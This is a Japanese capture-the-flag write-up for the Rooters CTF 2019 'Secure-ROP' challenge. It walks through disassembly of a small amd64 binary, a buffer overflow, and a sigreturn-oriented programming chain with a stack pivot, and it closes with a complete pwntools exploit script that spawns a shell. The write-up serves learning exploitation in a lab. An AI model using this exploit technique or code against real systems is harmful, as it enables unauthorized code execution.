---
tags: pwn
---

# Rooters CTF 2019 - \#Secure-ROP

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

問題のリポジトリ(何故かclone出来なかった): <https://github.com/abs0lut3pwn4g3/RootersCTF2019-challenges>

## Writeup

### Outline

自明なBOFがあるのにまともなROP Gadgetが無い。任意のシステムコールを呼ぶことは出来るのでrt_sigreturnを呼び出し、`read(0, &.data, size)`を呼ぶ。これで.dataセクションに`/bin/sh`とROPチェーンを書き込み、`leave; ret`でstack pivotしてからもう一度SROPして今度は`execve("/bin/sh", null, null)`をシステムコールで呼ぶ

### checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Binary

radare2で覗いてみると次のようになっている

```
            ;-- rip:
┌ 17: entry0 ();
│           0x00401037      e8c4ffffff     call fcn.00401000
│           0x0040103c      b83c000000     mov eax, 0x3c               ; '<' ; 60
│           0x00401041      bf00000000     mov edi, 0
└           0x00401046      0f05           syscall
```

```
            ; CALL XREF from entry0 @ 0x401037
            ;-- section..text:
            ;-- segment.LOAD1:
┌ 55: fcn.00401000 ();
│           0x00401000      55             push rbp                    ; [01] -r-x section size 72 named .text
│           0x00401001      4889e5         mov rbp, rsp
│           0x00401004      4883ec40       sub rsp, 0x40
│           0x00401008      b801000000     mov eax, 1
│           0x0040100d      bf01000000     mov edi, 1
│           0x00401012      488d34250020.  lea rsi, str.Hey__can_i_get_some_feedback_for_the_CTF ; 0x402000 ; "Hey, can i get some feedback for the CTF?\n\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
│           0x0040101a      ba2a000000     mov edx, 0x2a               ; '*' ; 42
│           0x0040101f      0f05           syscall
│           0x00401021      bf00000000     mov edi, 0
│           0x00401026      488d7424c0     lea rsi, [rsp - 0x40]
│           0x0040102b      ba00040000     mov edx, 0x400              ; 1024
│           0x00401030      6a00           push 0
│           0x00401032      58             pop rax
│           0x00401033      0f05           syscall
│           0x00401035      c9             leave
└           0x00401036      c3             ret
```

だいたい[前問](https://hackmd.io/@Xornet/BJi8X6slD)と同じで`read(0, buf, 0x400)`をしている。`buf`の位置からrbpまで0x80ある一方で0x400バイト書き込めることからBOFが存在する。

rabin2にかけるとこんな感じ

```
$ rabin2 -sSz
[Sections]

nth paddr       size vaddr       vsize perm name
――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000   0x0 0x00000000    0x0 ---- 
1   0x00001000  0x48 0x00401000   0x48 -r-x .text
2   0x00002000  0x2a 0x00402000   0x2a -rw- .data
3   0x0000202a  0x17 0x00000000   0x17 ---- .shstrtab

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002000 0x00402000 42  42   .data   ascii Hey, can i get some feedback for the CTF?\n
```

`/bin/sh`は無いので前問のように1回のrt_sigreturnシステムコールでシェルを起動するのは出来ない。まずはシェルを起動するために`/bin/sh`を.dataセクションに書き込むことを考える

## `/bin/sh`の書き込み

今回も`pop rax; syscall`が存在するのでBOFでこれをリターンアドレスに置いてrt_sigreturnシステムコールを呼ぶ。ここで呼ぶのはread(番号: 0)で`read(0, &.data, size)`とすれば.dataセクションの先頭から`size`バイト分だけ書き込む事ができる。ここでまずは`/bin/sh`を書き込む

## stack pivot

シェル起動用の文字列を書き込むだけで終わりではない。使ったgadgetをよく見ると`pop rax; syscall; leave; ret`となっている。
leave命令は`mov rsp, rbp; pop rbp`を実行することからsigreturnでrbpに上手く値を入れておけば次のスタックトップを指定できそうである。そして`ret`するのでここで再びsigreturnでシステムコールを呼ぶようにしておけば今度こそexecveを使ってシェルを起動出来そうである

というわけでBOFを利用する際の書き込みは次のようなレジスタになるようにする

```
rax: 0  // read(0, &.data, size)
rdi: 0
rsi: &.data
rdx: size  // 余裕を持って0x400ぐらいにしておいた
rip: &syscall; leave; ret
rbp: .data  // ripにleaveを仕込んだので&.data + 0x8がstack topになってretする
```

これでreadがシステムコールで呼ばれることからもう1度入力が出来る。
.dataセクションの先頭から次のように書き込むことで`/bin/sh`を書きながらstack pivot後にROPで再びシステムコールを呼べるようにする

```
.data        : "/bin/sh\x00"  // leave(mov rsp, rbp; pop rbp)でrspはここに来て、rbpにpopする
.data + 0x08 : &pop rax; syscall  // retでpop rax; syscallへ飛ぶ
.data + 0x10 : 0xf
.data + 0x18 : (values...)
```

`values`の部分はrt_sigreturnシステムコールで次のようなレジスタになるようにする

```
rax: 59
rdi: &.data  // /bin/shが入っている
rsi: 0
rdx: 0
rip: &syscall
```

これで`execve("/bin/sh", null, null)`が呼ばれることになる

## Code

```python
from pwn import p64, u64, ELF, process, remote, SigreturnFrame, context


if __name__ == "__main__":
    elf = ELF("vuln")
    context.binary = elf
    data_start = 0x402000
    gadgets = {
        "syscall": 0x401046,
        "syscall_leave_ret": 0x401033,
        "pop_rax_syscall_leave_ret": 0x401032
    }

    s = process(elf.path)
    # s = remote("", None)

    # _ = input("[+] debug\n")

    junk = b"a" * 0x88
    payload = junk
    payload += p64(gadgets["pop_rax_syscall_leave_ret"])
    payload += p64(0xf)
    
    # stack pivot
    size = 0x400
    frame = SigreturnFrame()
    frame["rax"] = 0  # read(0, data_start, size)
    frame["rdi"] = 0
    frame["rsi"] = data_start
    frame["rdx"] = size
    frame["rbp"] = data_start  # when leave executed, moved to rsp
    frame["rip"] = gadgets["syscall_leave_ret"]

    payload += bytes(frame)
    s.send(payload)

    # write /bin/sh to .data section
    payload = b"/bin/sh\x00"
    payload += p64(gadgets["pop_rax_syscall_leave_ret"])
    payload += p64(0xf)

    frame = SigreturnFrame()
    frame["rax"] = 59  # execve("/bin/sh", null, null)
    frame["rdi"] = data_start
    frame["rsi"] = 0
    frame["rdx"] = 0
    frame["rip"] = gadgets["syscall"]

    payload += bytes(frame)
    s.send(payload)

    s.interactive()

```

## Flag

ローカルシェル取り太郎先輩

## 感想

SROP第2段ということで解きました。同じ分野でも2回は解いておきたいので2問解きましたがstack pivotが要求されるこちらの方がやや複雑でした。
これでまた次のpwnネタが発生するまでしばらくサボります、Heapはクソムズい問題しか残ってなくて新しいネタもあんまり見つけて無くて辛いです